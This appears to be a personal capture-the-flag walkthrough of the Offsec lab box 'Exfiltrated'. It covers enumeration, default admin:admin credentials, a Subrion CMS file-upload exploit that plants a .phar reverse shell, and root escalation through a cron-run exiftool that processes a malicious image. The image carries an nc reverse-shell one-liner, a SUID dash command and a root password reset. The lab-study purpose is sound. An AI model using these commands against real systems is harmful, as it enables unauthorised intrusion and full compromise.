---
box_name: "Exfiltrated"
author: "James Heringer"
platform: "Offsec"
date: 2025-10-02
tags: [CRON,EXIF,Subrion]
difficulty: "easy"
---

# EXFILTRATED

* [Exfiltrated](https://portal.offsec.com/machine/exfiltrated-17398/overview/details)
* Target IP = 192.168.102.163
* Tun0 IP =   192.168.45.167

## Summary
1. Enum, identify Virtual Host in place.
2. Add exfiltrated.offsec to /etc/hosts
3. Enumerate again, find URL : http://exfiltrated.offsec/panel/
4. Guess password for admin user, (admin:admin)
5. Searchsploit identify Subrion CMS has file upload vuln.
6. Find file upload section, insert PHP reverse shell with .phar extension
7. Identify running CRON job with root user using pspy64 tool
8. Alternative, read CRONtab `cat /etc/crontab`
9. Identify image-exif.sh script running every minute
10. Read thorugh .sh script to identify IMAGE folder and EXIF tool being used
11. Identify VULN in exif tool , `exif -version; searchsploit exiftool`
12. Test RevShell to find variant that loads in this environment with www-data user, before building image file
13. Stage RevShell image file in `/var/www/html/subrion/uploads`
14. Profit

## Enum
```bash
sudo masscan 192.168.102.163 --top-ports 1000 --rate 1000 -e tun0
Discovered open port 22/tcp on 192.168.102.163                                 
Discovered open port 80/tcp on 192.168.102.163  

sudo nmap -p22,80  -sV -sC -O -T4 192.168.102.163
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)

# go buster had a wierd error.. had to add this blacklist section
gobuster dir -u http://192.168.102.163 -w /usr/share/wordlists/dirb/common.txt -t 40 -x .php,.txt,.html --status-codes-blacklist 302,301

changelog.txt        (Status: 200) [Size: 49250]
/favicon.ico          (Status: 200) [Size: 1150]
/license.txt          (Status: 200) [Size: 35147]
/panel.txt            (Status: 200) [Size: 6083]
/panel.php            (Status: 200) [Size: 6083]
/panel.html           (Status: 200) [Size: 6083]
sitemap.xml          (Status: 200) 
/robots.txt           (Status: 200)

# CURL headers
curl -I http://192.168.102.163  
#Server: Apache/2.4.41 (Ubuntu)

curl -i http://192.168.102.163/robots.txt
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/      
```

* Browsing initially didn't work, had to update /etc/hosts file with `192.168.102.163 exfiltrated.offsec`
* There was a link to Admin Dasbhoard on homepage, logged in wth default credential of `admin:admin`
* Good link here as well : http://exfiltrated.offsec/panel/
* Under Content -> BLog -> lists valid extensions for upload192.1

```shell 
searchsploit -t "subrion"     
searchsploit -m  php/webapps/49876.py
python3 ./49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
http://exfiltrated.offsec/panel/uploads/oaqmeccppvspham.phar 


```
* once initial 'webshell' is uploaded.. go back into the panel.. and upload the simple-php-reverse-shell, but name it .phar
* access it by right-click -> get info -> LINK
* Bash RevShell should now be online
```bash
* cat /etc/crontab
	* * *	root	bash /opt/image-exif.sh

```

* searchsploit exiftool
* searchsploit -m linux/local/50911.py
* Exif tool is getting executed by root, so  we need to get a malicious image in place for it to trigger
* Missing dependency for the exploiit.. 
* sudo apt install djvulibre-bin

* 50911.py -c "chmod u+s /bin/dash"   # output is an image.jpg file
* python3 50911.py -c "echo 'root:pass' | sudo chpasswd" 
python3 50911.py -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.167 4445 >/tmp/f"
* Note : test the stupid rev shell to ensure it works beforoe trying to embed it into the image.. 


* set the SUID bit, so after cron runs, if we run dash we'll be root
* stage file and grab from target: witih wget
cat /opt/image-exif.sh
IMAGES='/var/www/html/subrion/uploads'
 cp image.jpg /var/www/html/subrion/uploads/


## LOOT 
```bash
 # cat local.txt
63593e7ea6cc6079ac01866717e1aa9d
# pwd
/home/coaran
# pwd
/root
# cat proof.txt
2e6291d371270765d93af8137ddf8c08



